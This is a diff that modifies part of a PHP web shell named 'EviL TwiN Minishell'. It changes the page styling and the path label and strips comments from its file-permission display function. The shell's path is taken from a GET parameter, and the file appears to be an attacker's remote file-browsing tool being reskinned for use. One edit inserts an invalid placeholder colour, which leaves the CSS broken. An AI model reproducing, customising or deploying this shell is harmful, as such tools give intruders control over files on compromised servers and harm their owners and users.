@@ -15,12 +15,12 @@ echo '<!DOCTYPE HTML>
 <meta name="robots" content="NOINDEX. NOFOLLOW, NOARCHIVE">
 <link href="https://fonts.googleapis.com/css2?family=Inika&display=swap" rel="stylesheet">
 <title>EviL TwiN Minishell</title>
-<style>body { font-family: "Inika", serif; background-color: #561000; color:white;} tr:hover{ background-color: #970B00;}.first{ background-color: #970B00;}table{ border: 1px #FFFFFF solid;}a{color:white;text-decoration: none;}a:hover{color:lime;}input,select,textarea{border: 1px #FFFFFF solid;-moz-border-radius: 5px;-webkit-border-radius:5px;border-radius:5px;}</style>
+<style>body { font-family: "Inika", serif; background-color: #561000; color:white;} tr:hover{ background-color: #ADDCOLORIFUWANT;}.first{ background-color: #970B00;}table{ border: 1px #FFFFFF solid;}a{color:white;text-decoration: none;}a:hover{color:lime;}input,select,textarea{border: 1px #FFFFFF solid;-moz-border-radius: 5px;-webkit-border-radius:5px;border-radius:5px;}</style>
 </head>
 <body>
 <center><a href="?"><font size="5">EviL TwiN Mini$hell</font></a></center>
 <table width="730" border ="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td><font color="white">eviltwin :</font> ';
+<tr><td><font color="white">Path :</font> ';
 if(isset($_GET['eviltwin'])){
 $eviltwin = $_GET['eviltwin'];
 }else{
@@ -259,46 +259,35 @@ function perms($file){
 $perms = fileperms($file);
 
 if (($perms & 0xC000) == 0xC000) {
-// Socket
 $info = 's';
 } elseif (($perms & 0xA000) == 0xA000) {
-// Symbolic Link
 $info = 'l';
 } elseif (($perms & 0x8000) == 0x8000) {
-// Regular
 $info = '-';
 } elseif (($perms & 0x6000) == 0x6000) {
-// Block special
 $info = 'b';
 } elseif (($perms & 0x4000) == 0x4000) {
-// Directory
 $info = 'd';
 } elseif (($perms & 0x2000) == 0x2000) {
-// Character special
 $info = 'c';
 } elseif (($perms & 0x1000) == 0x1000) {
-// FIFO pipe
 $info = 'p';
 } else {
-// Unknown
 $info = 'u';
 }
 
-// Owner
 $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ?
 (($perms & 0x0800) ? 's' : 'x' ) :
 (($perms & 0x0800) ? 'S' : '-'));
 
-// Group
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ?
 (($perms & 0x0400) ? 's' : 'x' ) :
 (($perms & 0x0400) ? 'S' : '-'));
 
-// World
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ?
